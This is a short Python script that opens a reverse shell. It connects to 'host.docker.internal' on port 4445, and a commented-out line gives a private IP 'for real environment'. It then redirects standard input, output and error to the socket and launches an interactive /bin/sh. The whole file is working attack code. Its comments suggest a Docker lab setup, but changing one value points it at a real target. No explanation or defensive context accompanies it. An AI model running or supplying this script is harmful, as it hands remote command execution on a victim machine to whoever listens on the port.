import socket, subprocess, os, pty

# IP = "192.168.102.7"  # owner ip apply for real environment
IP="host.docker.internal" #this apply for docker desktop only
PORT = 4445

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
